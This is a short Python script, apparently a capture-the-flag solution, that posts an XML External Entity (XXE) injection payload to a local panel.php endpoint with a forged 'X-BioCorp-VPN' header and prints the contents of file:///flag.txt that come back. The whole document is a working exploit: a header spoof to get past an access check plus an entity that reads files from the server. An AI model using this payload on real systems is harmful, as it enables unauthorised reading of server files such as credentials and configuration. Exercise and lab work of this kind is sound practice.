import requests

# Target URL and headers
url = "http://127.0.0.1/panel.php"
headers = {
    "X-BioCorp-VPN": "80.187.61.102",
    "Content-Type": "application/xml"
}

# XML payload with XXE injection
data = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE reactor [
<!ENTITY xxe SYSTEM "file:///flag.txt">
]>
<reactor>
    <status>
        <temperature>&xxe;</temperature>
        <pressure>2000</pressure>
        <control_rods>Lowered</control_rods>
    </status>
</reactor>
"""

# Send the request
response = requests.post(url, headers=headers, data=data)

# Check the response
if response.status_code == 200:
    print("Response received:")
    print(response.text)
else:
    print(f"Request failed with status code {response.status_code}")
